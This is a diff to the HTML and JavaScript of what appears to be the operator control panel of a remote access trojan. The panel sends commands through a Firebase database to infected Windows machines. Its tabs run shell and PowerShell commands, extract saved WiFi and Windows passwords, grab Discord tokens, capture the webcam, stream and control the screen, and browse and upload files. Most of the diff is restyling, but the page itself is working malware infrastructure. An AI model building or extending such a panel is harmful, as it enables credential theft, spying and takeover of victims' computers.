@@ -5,94 +5,102 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Client</title>
 <style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden}
-::-webkit-scrollbar{width:6px}
-::-webkit-scrollbar-track{background:#0a0c10}
-::-webkit-scrollbar-thumb{background:#30363d;border-radius:4px}
-::-webkit-scrollbar-thumb:hover{background:#484f58}
-.header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:1px solid #21262d;padding:0 1.5rem;display:flex;align-items:center;height:56px;position:sticky;top:0;z-index:100;gap:1rem}
-.header .back{color:#58a6ff;text-decoration:none;font-size:1.2rem;font-weight:700;width:34px;height:34px;display:flex;align-items:center;justify-content:center;border-radius:8px;transition:all .2s}
-.header .back:hover{background:rgba(88,166,255,.1)}
-.header h1{color:#f0f6fc;font-size:1rem;font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.header .meta{color:#8b949e;font-size:.78rem;text-align:right}
-.main{padding:1rem 1.5rem;max-width:1400px;margin:0 auto}
-.tabs{display:flex;gap:.25rem;margin-bottom:.8rem;border-bottom:1px solid #21262d;padding-bottom:.4rem;overflow-x:auto}
-.tab{background:transparent;color:#8b949e;border:none;padding:.4rem .85rem;cursor:pointer;font-size:.82rem;font-weight:500;border-radius:6px 6px 0 0;transition:all .2s;white-space:nowrap;display:flex;align-items:center;gap:.35rem}
-.tab:hover{color:#e6edf3;background:rgba(255,255,255,.04)}
-.tab.active{color:#58a6ff;background:rgba(88,166,255,.1);box-shadow:inset 0 -2px 0 #58a6ff}
-.panel{display:none;animation:fadeIn .2s ease}
+body{background:#0b0d12;color:#e8edf5;font-family:'Inter','Segoe UI',system-ui,sans-serif;min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 20% 50%,rgba(88,100,255,.04)0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(130,80,223,.03)0%,transparent 50%),radial-gradient(ellipse at 50% 80%,rgba(30,160,80,.02)0%,transparent 50%);pointer-events:none;z-index:0}
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:#0b0d12}
+::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:10px}
+::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,.15)}
+.header{position:sticky;top:0;z-index:100;background:rgba(11,13,18,.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid rgba(255,255,255,.06);padding:0 1.5rem;display:flex;align-items:center;height:56px;gap:1rem}
+.header .back{color:rgba(255,255,255,.4);text-decoration:none;font-size:1.1rem;font-weight:700;width:34px;height:34px;display:flex;align-items:center;justify-content:center;border-radius:8px;transition:all .2s}
+.header .back:hover{color:#fff;background:rgba(255,255,255,.06)}
+.header h1{color:#f0f4fc;font-size:1rem;font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.header .meta{color:rgba(255,255,255,.3);font-size:.75rem;text-align:right}
+.main{padding:1rem 1.5rem;max-width:1400px;margin:0 auto;position:relative;z-index:1}
+.tabs{display:flex;gap:.15rem;margin-bottom:.8rem;border-bottom:1px solid rgba(255,255,255,.06);padding-bottom:.35rem;overflow-x:auto}
+.tab{background:transparent;color:rgba(255,255,255,.35);border:none;padding:.35rem .8rem;cursor:pointer;font-size:.8rem;font-weight:500;border-radius:6px 6px 0 0;transition:all .2s;white-space:nowrap;display:flex;align-items:center;gap:.3rem}
+.tab:hover{color:rgba(255,255,255,.7);background:rgba(255,255,255,.03)}
+.tab.active{color:#818cf8;background:rgba(88,100,255,.08);box-shadow:inset 0 -1.5px 0 #818cf8}
+.panel{display:none;animation:panelIn .2s ease}
 .panel.active{display:block}
-@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+@keyframes panelIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
 .cmd-wrap{display:flex;gap:.5rem;margin-bottom:.5rem}
-.cmd-wrap input{flex:1;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:.55rem .8rem;color:#e6edf3;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:.85rem;outline:none;transition:border-color .2s}
-.cmd-wrap input:focus{border-color:#58a6ff}
-.output{background:#161b22;border:1px solid #21262d;border-radius:10px;padding:1rem;color:#e6edf3;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:.82rem;min-height:300px;max-height:70vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.5}
-.output .prompt{color:#58a6ff;font-weight:600}
-.screenshot{max-width:100%;border-radius:10px;border:1px solid #21262d;display:block;background:#000}
-.loading{color:#484f58;text-align:center;padding:2rem;font-size:.9rem}
-.loading .spinner{display:inline-block;width:18px;height:18px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;margin-right:.5rem;vertical-align:middle}
+.cmd-wrap input{flex:1;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:10px;padding:.55rem .8rem;color:#e8edf5;font-family:'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;font-size:.82rem;outline:none;transition:border-color .2s}
+.cmd-wrap input:focus{border-color:rgba(88,100,255,.4)}
+.output{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px;padding:1rem;color:#e8edf5;font-family:'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;font-size:.8rem;min-height:300px;max-height:70vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.5}
+.screenshot{max-width:100%;border-radius:12px;border:1px solid rgba(255,255,255,.06);display:block;background:#000}
+.loading{color:rgba(255,255,255,.2);text-align:center;padding:2.5rem;font-size:.88rem}
+.loading .spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.06);border-top-color:#818cf8;border-radius:50%;animation:spin .8s linear infinite;margin-right:.6rem;vertical-align:middle}
 @keyframes spin{to{transform:rotate(360deg)}}
-.btn{border:none;padding:.4rem .9rem;border-radius:8px;cursor:pointer;font-size:.82rem;font-weight:600;transition:all .2s;display:inline-flex;align-items:center;gap:.4rem}
-.btn:active{transform:scale(.95)}
-.btn-primary{background:linear-gradient(135deg,#238636,#2ea043);color:#fff}
-.btn-primary:hover{box-shadow:0 4px 12px rgba(35,134,54,.3);transform:translateY(-1px)}
-.btn-accent{background:linear-gradient(135deg,#1f6feb,#58a6ff);color:#fff}
-.btn-accent:hover{box-shadow:0 4px 12px rgba(31,111,235,.3);transform:translateY(-1px)}
-.btn-danger{background:linear-gradient(135deg,#da3633,#f85149);color:#fff}
-.btn-danger:hover{box-shadow:0 4px 12px rgba(218,54,51,.3);transform:translateY(-1px)}
-.btn-ghost{background:transparent;color:#8b949e;border:1px solid #30363d}
-.btn-ghost:hover{background:#21262d;color:#e6edf3}
-.btn-orange{background:linear-gradient(135deg,#d29922,#e3b341);color:#fff}
-.btn-orange:hover{box-shadow:0 4px 12px rgba(210,153,34,.3);transform:translateY(-1px)}
-.btn-purple{background:linear-gradient(135deg,#8250df,#b083f0);color:#fff}
-.btn-purple:hover{box-shadow:0 4px 12px rgba(130,80,223,.3);transform:translateY(-1px)}
-.btn-cyan{background:linear-gradient(135deg,#1f7a8c,#3fb5c9);color:#fff}
-.btn-cyan:hover{box-shadow:0 4px 12px rgba(31,122,140,.3);transform:translateY(-1px)}
-.btn.active-toggle{outline:2px solid #58a6ff;outline-offset:2px;background:rgba(88,166,255,.15)!important;border-color:#58a6ff!important;color:#58a6ff!important}
-.btn-sm{padding:.25rem .6rem;font-size:.75rem}
+.btn{border:none;padding:.4rem .9rem;border-radius:8px;cursor:pointer;font-size:.8rem;font-weight:600;transition:all .2s;display:inline-flex;align-items:center;gap:.4rem}
+.btn:active{transform:scale(.94)}
+.btn-primary{background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;box-shadow:0 2px 10px rgba(34,197,94,.2)}
+.btn-primary:hover{box-shadow:0 4px 20px rgba(34,197,94,.3);transform:translateY(-1px)}
+.btn-accent{background:linear-gradient(135deg,#5864ff,#7c3aed);color:#fff;box-shadow:0 2px 10px rgba(88,100,255,.2)}
+.btn-accent:hover{box-shadow:0 4px 20px rgba(88,100,255,.3);transform:translateY(-1px)}
+.btn-danger{background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff;box-shadow:0 2px 10px rgba(239,68,68,.2)}
+.btn-danger:hover{box-shadow:0 4px 20px rgba(239,68,68,.3);transform:translateY(-1px)}
+.btn-ghost{background:rgba(255,255,255,.04);color:rgba(255,255,255,.45);border:1px solid rgba(255,255,255,.08)}
+.btn-ghost:hover{background:rgba(255,255,255,.08);color:rgba(255,255,255,.75)}
+.btn-orange{background:linear-gradient(135deg,#fb923c,#f97316);color:#fff;box-shadow:0 2px 10px rgba(251,146,60,.2)}
+.btn-orange:hover{box-shadow:0 4px 20px rgba(251,146,60,.3);transform:translateY(-1px)}
+.btn-purple{background:linear-gradient(135deg,#a78bfa,#7c3aed);color:#fff;box-shadow:0 2px 10px rgba(167,139,250,.2)}
+.btn-purple:hover{box-shadow:0 4px 20px rgba(167,139,250,.3);transform:translateY(-1px)}
+.btn-cyan{background:linear-gradient(135deg,#22d3ee,#06b6d4);color:#fff;box-shadow:0 2px 10px rgba(34,211,238,.2)}
+.btn-cyan:hover{box-shadow:0 4px 20px rgba(34,211,238,.3);transform:translateY(-1px)}
+.btn.active-toggle{outline:2px solid #818cf8;outline-offset:2px;background:rgba(88,100,255,.15)!important;border-color:rgba(88,100,255,.3)!important;color:#818cf8!important}
+.btn-sm{padding:.25rem .6rem;font-size:.73rem}
 .btn-icon{padding:.35rem;min-width:32px;justify-content:center}
 .screen-container{position:relative;display:inline-block;max-width:100%}
 .screen-container canvas{position:absolute;top:0;left:0;cursor:crosshair}
-.ctrl-bar{display:flex;gap:.5rem;margin-bottom:.8rem;flex-wrap:wrap;align-items:center;padding:.5rem .9rem;background:#161b22;border:1px solid #21262d;border-radius:10px}
-.ctrl-bar .sep{color:#30363d;margin:0 .2rem}
-.ctrl-bar .label{color:#8b949e;font-size:.78rem;margin-right:.3rem}
-.err{color:#f85149;font-size:.8rem;padding:.5rem .8rem;background:#161b22;border:1px solid #da3633;border-radius:8px;margin-bottom:.5rem;display:none}
-.files{background:#161b22;border:1px solid #21262d;border-radius:10px;min-height:300px;max-height:70vh;overflow-y:auto;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:.8rem}
-.files .path{background:#0d1117;border-bottom:1px solid #21262d;padding:.45rem .8rem;color:#58a6ff;display:flex;align-items:center;gap:.5rem;border-radius:10px 10px 0 0;position:sticky;top:0;z-index:2}
+.ctrl-bar{display:flex;gap:.45rem;margin-bottom:.8rem;flex-wrap:wrap;align-items:center;padding:.5rem .9rem;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:10px}
+.ctrl-bar .sep{color:rgba(255,255,255,.06);margin:0 .15rem}
+.ctrl-bar .label{color:rgba(255,255,255,.3);font-size:.73rem;margin-right:.15rem;font-weight:500;text-transform:uppercase;letter-spacing:.03em}
+.err{color:#f87171;font-size:.78rem;padding:.5rem .8rem;background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.15);border-radius:8px;margin-bottom:.5rem;display:none}
+.files{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px;min-height:300px;max-height:70vh;overflow-y:auto;font-family:'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;font-size:.78rem}
+.files .path{background:rgba(0,0,0,.2);border-bottom:1px solid rgba(255,255,255,.06);padding:.4rem .8rem;color:#818cf8;display:flex;align-items:center;gap:.5rem;border-radius:12px 12px 0 0;position:sticky;top:0;z-index:2}
 .files .path span{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.files .entry{padding:.35rem .8rem;cursor:pointer;display:flex;align-items:center;gap:.5rem;border-bottom:1px solid #161b22;transition:background .12s}
+.files .entry{padding:.35rem .8rem;cursor:pointer;display:flex;align-items:center;gap:.5rem;border-bottom:1px solid rgba(255,255,255,.03);transition:background .12s}
 .files .entry:last-child{border-bottom:none}
-.files .entry:hover{background:rgba(88,166,255,.08)}
-.files .entry .ico{flex-shrink:0;width:1.2rem;text-align:center;font-size:.85rem}
-.files .entry .ico.folder{color:#d29922}
-.files .entry .ico.file{color:#8b949e}
-.files .entry .nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#e6edf3}
-.files .entry.dir .nm{color:#f0f6fc}
-.files .entry .sz{color:#484f58;font-size:.72rem;white-space:nowrap;min-width:5rem;text-align:right}
-.files .entry .dt{color:#484f58;font-size:.72rem;white-space:nowrap;min-width:8rem;text-align:right}
-select.mon{background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:8px;padding:.4rem .6rem;font-size:.82rem;outline:none;cursor:pointer}
-select.mon:focus{border-color:#58a6ff}
+.files .entry:hover{background:rgba(88,100,255,.06)}
+.files .entry .ico{flex-shrink:0;width:1.1rem;text-align:center;font-size:.82rem}
+.files .entry .ico.folder{color:#fb923c}
+.files .entry .ico.file{color:rgba(255,255,255,.25)}
+.files .entry .nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#e8edf5}
+.files .entry.dir .nm{color:#f0f4fc}
+.files .entry .sz{color:rgba(255,255,255,.2);font-size:.7rem;white-space:nowrap;min-width:4.5rem;text-align:right}
+.files .entry .dt{color:rgba(255,255,255,.2);font-size:.7rem;white-space:nowrap;min-width:7.5rem;text-align:right}
+.files .entry .acts{display:flex;gap:2px;flex-shrink:0;opacity:0;transition:opacity .15s;margin-left:4px}
+.files .entry:hover .acts{opacity:1}
+.btn-xs{padding:2px 5px;font-size:.62rem;border-radius:4px;line-height:1;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.06);color:rgba(255,255,255,.5);cursor:pointer;transition:all .15s;font-family:inherit}
+.btn-xs:hover{background:rgba(255,255,255,.1);color:#e8edf5}
+.drop-zone{border:2px dashed rgba(255,255,255,.08);border-radius:10px;padding:.5rem .8rem;text-align:center;font-size:.75rem;color:rgba(255,255,255,.25);margin-bottom:.6rem;transition:all .2s;cursor:pointer;position:relative}
+.drop-zone.drag-over{border-color:#818cf8;background:rgba(129,140,248,.06);color:#818cf8}
+.files .entry .nm{cursor:default}.files .entry.dir .nm{cursor:pointer}.files .entry.dir .nm:hover{color:#818cf8}
+select.mon{background:rgba(0,0,0,.3);color:#e8edf5;border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:.35rem .55rem;font-size:.8rem;outline:none;cursor:pointer;font-family:inherit}
+select.mon:focus{border-color:rgba(88,100,255,.4)}
 .capture-bar{display:flex;gap:.5rem;margin-bottom:.8rem;align-items:center;flex-wrap:wrap}
-.proc-table{width:100%;border-collapse:collapse;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:.78rem}
-.proc-table th{background:#0d1117;color:#8b949e;padding:.45rem .7rem;text-align:left;border-bottom:1px solid #21262d;position:sticky;top:0;font-weight:600}
-.proc-table td{padding:.3rem .7rem;border-bottom:1px solid #161b22}
-.proc-table tr:hover{background:rgba(88,166,255,.05)}
-.proc-table .pid{color:#484f58;width:5rem}
-.proc-table .pname{color:#e6edf3}
+.proc-table{width:100%;border-collapse:collapse;font-family:'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;font-size:.75rem}
+.proc-table th{background:rgba(0,0,0,.2);color:rgba(255,255,255,.35);padding:.4rem .7rem;text-align:left;border-bottom:1px solid rgba(255,255,255,.06);position:sticky;top:0;font-weight:600;font-size:.7rem;text-transform:uppercase;letter-spacing:.04em}
+.proc-table td{padding:.28rem .7rem;border-bottom:1px solid rgba(255,255,255,.03)}
+.proc-table tr:hover{background:rgba(88,100,255,.04)}
+.proc-table .pid{color:rgba(255,255,255,.25);width:4.5rem}
+.proc-table .pname{color:#e8edf5}
 .proc-table .pkill{width:3.5rem;text-align:center}
-.sysinfo-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:.8rem}
-.sysinfo-card{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:.9rem}
-.sysinfo-card .val{font-size:1.2rem;font-weight:700;color:#f0f6fc}
-.sysinfo-card .lbl{color:#8b949e;font-size:.78rem;margin-top:.15rem}
-.disk-bar{height:5px;background:#0d1117;border-radius:3px;margin-top:.35rem;overflow:hidden}
-.disk-bar .fill{height:100%;background:#58a6ff;border-radius:3px;transition:width .5s}
-.scroll-output{background:#161b22;border:1px solid #21262d;border-radius:10px;padding:.8rem;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:.8rem;min-height:200px;max-height:65vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.4}
-.toast{position:fixed;bottom:1.5rem;right:1.5rem;background:#238636;color:#fff;padding:.6rem 1.2rem;border-radius:8px;font-size:.85rem;font-weight:500;z-index:999;animation:slideUp .3s ease;pointer-events:none}
-@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.sysinfo-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:.7rem}
+.sysinfo-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:.85rem}
+.sysinfo-card .val{font-size:1.15rem;font-weight:700;color:#f0f4fc}
+.sysinfo-card .lbl{color:rgba(255,255,255,.3);font-size:.73rem;margin-top:.12rem;font-weight:500;text-transform:uppercase;letter-spacing:.03em}
+.disk-bar{height:4px;background:rgba(0,0,0,.3);border-radius:3px;margin-top:.3rem;overflow:hidden}
+.disk-bar .fill{height:100%;background:linear-gradient(90deg,#5864ff,#818cf8);border-radius:3px;transition:width .5s}
+.scroll-output{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px;padding:.8rem;font-family:'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;font-size:.78rem;min-height:200px;max-height:65vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.4}
+.toast{position:fixed;bottom:1.5rem;right:1.5rem;background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;padding:.6rem 1.2rem;border-radius:10px;font-size:.82rem;font-weight:600;z-index:999;animation:toastUp .3s ease;pointer-events:none;box-shadow:0 8px 30px rgba(34,197,94,.3)}
+@keyframes toastUp{from{opacity:0;transform:translateY(20px) scale(.95)}to{opacity:1;transform:translateY(0) scale(1)}}
 @media(max-width:768px){
 .main{padding:.8rem}.tabs{overflow-x:auto;-webkit-overflow-scrolling:touch}
-.tab{padding:.35rem .6rem;font-size:.78rem}.ctrl-bar{padding:.4rem}
+.tab{padding:.3rem .55rem;font-size:.75rem}.ctrl-bar{padding:.4rem}
 .files .entry .dt{display:none}.header .meta{display:none}
 .sysinfo-grid{grid-template-columns:1fr 1fr}
 }
@@ -100,24 +108,24 @@ select.mon:focus{border-color:#58a6ff}
 </head>
 <body>
 <div class="header">
-  <a class="back" href="index.html">&lt;-</a>
+  <a class="back" href="index.html">←</a>
   <h1 id="name">-</h1>
   <div class="meta" id="meta">-</div>
 </div>
 <div class="main">
   <div class="tabs">
     <div class="tab active" onclick="switchTab(this,'cmd')">CMD</div>
-    <div class="tab" onclick="switchTab(this,'screenshot')">Screenshot</div>
-    <div class="tab" onclick="switchTab(this,'screen')">Screen</div>
-    <div class="tab" onclick="switchTab(this,'processes')">Processes</div>
-    <div class="tab" onclick="switchTab(this,'system')">System</div>
-    <div class="tab" onclick="switchTab(this,'passwords')">Passwords</div>
-    <div class="tab" onclick="switchTab(this,'network')">Network</div>
-    <div class="tab" onclick="switchTab(this,'services')">Services</div>
-    <div class="tab" onclick="switchTab(this,'apps')">Apps</div>
-    <div class="tab" onclick="switchTab(this,'files')">Files</div>
-    <div class="tab" onclick="switchTab(this,'webcam')">Webcam</div>
-    <div class="tab" onclick="switchTab(this,'tokens')">Tokens</div>
+    <div class="tab" onclick="switchTab(this,'screenshot')">SCREENSHOT</div>
+    <div class="tab" onclick="switchTab(this,'screen')">LIVE</div>
+    <div class="tab" onclick="switchTab(this,'processes')">PROCESSES</div>
+    <div class="tab" onclick="switchTab(this,'system')">SYSTEM</div>
+    <div class="tab" onclick="switchTab(this,'passwords')">PASSWORDS</div>
+    <div class="tab" onclick="switchTab(this,'network')">NETWORK</div>
+    <div class="tab" onclick="switchTab(this,'services')">SERVICES</div>
+    <div class="tab" onclick="switchTab(this,'apps')">APPS</div>
+    <div class="tab" onclick="switchTab(this,'files')">FILES</div>
+    <div class="tab" onclick="switchTab(this,'webcam')">WEBCAM</div>
+    <div class="tab" onclick="switchTab(this,'tokens')">TOKENS</div>
   </div>
 
   <div class="panel active" id="panel-cmd">
@@ -125,7 +133,7 @@ select.mon:focus{border-color:#58a6ff}
       <input id="cmdInput" placeholder="Type command and press Enter..." onkeydown="if(event.key==='Enter')runCmd()">
       <button class="btn btn-accent" onclick="runCmd()">Run</button>
       <button class="btn btn-ghost btn-icon" onclick="copyCmdHistory()" title="Copy history">📋</button>
-      <button class="btn btn-ghost btn-icon" onclick="document.getElementById('cmdOutput').textContent='Ready.'" title="Clear output">✕</button>
+      <button class="btn btn-ghost btn-icon" onclick="document.getElementById('cmdOutput').textContent='Ready.'" title="Clear">✕</button>
     </div>
     <div class="output" id="cmdOutput">Ready.</div>
     <div id="cmdErr" class="err"></div>
@@ -142,8 +150,8 @@ select.mon:focus{border-color:#58a6ff}
 
   <div class="panel" id="panel-screen">
     <div class="ctrl-bar">
-      <button class="btn btn-primary btn-sm" id="screenStartBtn" onclick="startScreen()">[&gt;] Start Live</button>
-      <button class="btn btn-danger btn-sm" id="screenStopBtn" onclick="stopScreen()" style="display:none">[X] Stop</button>
+      <button class="btn btn-primary btn-sm" id="screenStartBtn" onclick="startScreen()">▶ Start Live</button>
+      <button class="btn btn-danger btn-sm" id="screenStopBtn" onclick="stopScreen()" style="display:none">■ Stop</button>
       <span class="sep">|</span>
       <span class="label">Mouse:</span>
       <button class="btn btn-ghost btn-sm" id="mouseBtn" onclick="toggleMouse()">OFF</button>
@@ -152,18 +160,16 @@ select.mon:focus{border-color:#58a6ff}
       <span class="sep">|</span>
       <span class="label">Quality:</span>
       <input type="range" id="liveQuality" min="5" max="50" value="25" style="width:60px;vertical-align:middle" oninput="liveQualityVal.textContent=this.value;sendLiveConfig()">
-      <span id="liveQualityVal" style="color:#8b949e;font-size:.7rem;min-width:1.5rem">25</span>
-      <span id="screenFps" style="color:#8b949e;font-size:.78rem;margin-left:auto"></span>
+      <span id="liveQualityVal" style="color:rgba(255,255,255,.5);font-size:.7rem;min-width:1.5rem">25</span>
+      <span id="screenFps" style="color:rgba(255,255,255,.2);font-size:.75rem;margin-left:auto"></span>
     </div>
-    <div id="screenResult"><div class="loading">Click Start to begin live view</div></div>
-  </div>
     <div id="screenResult"><div class="loading">Click Start to begin live view</div></div>
   </div>
 
   <div class="panel" id="panel-processes">
     <div class="capture-bar">
-      <button class="btn btn-primary" onclick="loadProcesses()">Refresh</button>
-      <span id="procCount" style="color:#8b949e;font-size:.78rem"></span>
+      <button class="btn btn-primary" onclick="loadProcesses()">⟳ Refresh</button>
+      <span id="procCount" style="color:rgba(255,255,255,.2);font-size:.75rem"></span>
     </div>
     <div id="procResult"><div class="loading">Click Refresh to list processes</div></div>
     <div id="procErr" class="err"></div>
@@ -184,16 +190,16 @@ select.mon:focus{border-color:#58a6ff}
     </div>
     <div class="ctrl-bar" style="margin-bottom:.5rem">
       <span class="label">Volume:</span>
-      <input type="range" id="volSlider" min="0" max="100" value="50" style="flex:1;max-width:180px" oninput="setVolume(this.value)">
-      <span id="volVal" style="color:#e6edf3;font-size:.82rem;width:2.5rem">50</span>
+      <input type="range" id="volSlider" min="0" max="100" value="50" style="flex:1;max-width:160px;accent-color:#818cf8;height:4px" oninput="setVolume(this.value)">
+      <span id="volVal" style="color:#e8edf5;font-size:.8rem;width:2.5rem">50</span>
       <span class="sep">|</span>
       <span class="label">PowerShell:</span>
-      <input id="psInput" placeholder="command" style="flex:1;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:.35rem .6rem;color:#e6edf3;font-size:.8rem;outline:none;max-width:280px">
+      <input id="psInput" placeholder="command" style="flex:1;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:.35rem .6rem;color:#e8edf5;font-size:.78rem;outline:none;max-width:260px;font-family:inherit">
       <button class="btn btn-accent btn-sm" onclick="runPowerShell()">Run</button>
     </div>
     <div class="ctrl-bar">
       <span class="label">System Info:</span>
-      <button class="btn btn-ghost btn-sm" onclick="loadSysInfo()">Refresh Info</button>
+      <button class="btn btn-ghost btn-sm" onclick="loadSysInfo()">⟳ Refresh Info</button>
     </div>
     <div id="sysInfoCards" class="sysinfo-grid" style="margin-bottom:.5rem;display:none"></div>
     <div id="sysResult" class="scroll-output"><div class="loading">System commands ready</div></div>
@@ -202,8 +208,8 @@ select.mon:focus{border-color:#58a6ff}
 
   <div class="panel" id="panel-passwords">
     <div class="capture-bar">
-      <button class="btn btn-orange" onclick="loadPasswords()">Extract Passwords</button>
-      <span style="color:#8b949e;font-size:.78rem">WiFi + Windows Credentials</span>
+      <button class="btn btn-orange" onclick="loadPasswords()">🔑 Extract Passwords</button>
+      <span style="color:rgba(255,255,255,.2);font-size:.75rem">WiFi + Windows Credentials</span>
     </div>
     <div id="pwResult" class="scroll-output"><div class="loading">Click to extract saved passwords</div></div>
     <div id="pwErr" class="err"></div>
@@ -211,7 +217,7 @@ select.mon:focus{border-color:#58a6ff}
 
   <div class="panel" id="panel-network">
     <div class="capture-bar">
-      <button class="btn btn-cyan" onclick="loadNetworkInfo()">Get Network Info</button>
+      <button class="btn btn-cyan" onclick="loadNetworkInfo()">🌐 Get Network Info</button>
     </div>
     <div id="netResult" class="scroll-output"><div class="loading">Click to get network information</div></div>
     <div id="netErr" class="err"></div>
@@ -219,8 +225,8 @@ select.mon:focus{border-color:#58a6ff}
 
   <div class="panel" id="panel-services">
     <div class="capture-bar">
-      <button class="btn btn-purple" onclick="loadServices()">List Services</button>
-      <span id="svcCount" style="color:#8b949e;font-size:.78rem"></span>
+      <button class="btn btn-purple" onclick="loadServices()">⚙ List Services</button>
+      <span id="svcCount" style="color:rgba(255,255,255,.2);font-size:.75rem"></span>
     </div>
     <div id="svcResult" class="scroll-output"><div class="loading">Click to list services</div></div>
     <div id="svcErr" class="err"></div>
@@ -228,14 +234,18 @@ select.mon:focus{border-color:#58a6ff}
 
   <div class="panel" id="panel-apps">
     <div class="capture-bar">
-      <button class="btn btn-accent" onclick="loadInstalledApps()">List Installed Apps</button>
-      <span style="color:#8b949e;font-size:.78rem">May take a moment</span>
+      <button class="btn btn-accent" onclick="loadInstalledApps()">📦 List Installed Apps</button>
+      <span style="color:rgba(255,255,255,.2);font-size:.75rem">May take a moment</span>
     </div>
     <div id="appResult" class="scroll-output"><div class="loading">Click to list installed applications</div></div>
     <div id="appErr" class="err"></div>
   </div>
 
   <div class="panel" id="panel-files">
+    <div class="drop-zone" id="dropZone" ondragover="event.preventDefault();this.classList.add('drag-over')" ondragleave="this.classList.remove('drag-over')" ondrop="handleDrop(event)">
+      <span>Drop files here or <a onclick="document.getElementById('filePicker').click()" style="color:#818cf8;cursor:pointer;text-decoration:underline">browse</a></span>
+      <input type="file" id="filePicker" multiple style="display:none" onchange="handleFilePick(this)">
+    </div>
     <div class="files" id="filesBrowser">
       <div class="loading">Click a directory to browse</div>
     </div>
@@ -244,7 +254,7 @@ select.mon:focus{border-color:#58a6ff}
 
   <div class="panel" id="panel-webcam">
     <div class="capture-bar">
-      <button class="btn btn-primary" onclick="takeWebcam()">Capture Webcam</button>
+      <button class="btn btn-primary" onclick="takeWebcam()">📷 Capture Webcam</button>
     </div>
     <div id="wcResult"><div class="loading">Click button to capture</div></div>
     <div id="wcErr" class="err"></div>
@@ -252,7 +262,7 @@ select.mon:focus{border-color:#58a6ff}
 
   <div class="panel" id="panel-tokens">
     <div class="capture-bar">
-      <button class="btn btn-danger" onclick="grabTokens()">Grab Discord Tokens</button>
+      <button class="btn btn-danger" onclick="grabTokens()">🔑 Grab Discord Tokens</button>
     </div>
     <div id="tokenResult" class="scroll-output"><div class="loading">Click to grab tokens</div></div>
     <div id="tokenErr" class="err"></div>
@@ -263,7 +273,6 @@ select.mon:focus{border-color:#58a6ff}
 const FB='https://solix-710c0-default-rtdb.europe-west1.firebasedatabase.app';
 const params=new URLSearchParams(window.location.search);
 const computer=params.get('name')||'';
-
 document.getElementById('name').textContent=computer||'Unknown';
 document.title=computer||'Client';
 
@@ -290,12 +299,12 @@ async function sendAndWait(type,payload,el,errId){
  if(errEl)errEl.style.display='none';
  el.innerHTML='<div class="loading"><span class="spinner"></span>Sending...</div>';
  try{
-  const r=await fetch(FB+'/commands/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,payload:payload||'',status:'pending'})});
+  const r=await fetch(FB+'/commands/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});
   if(!r.ok){el.innerHTML='<div class="loading">HTTP '+r.status+'</div>';if(errEl){errEl.textContent='Server returned '+r.status;errEl.style.display='block';}return null;}
   const data=await r.json();
   const cmdId=data&&data.name;
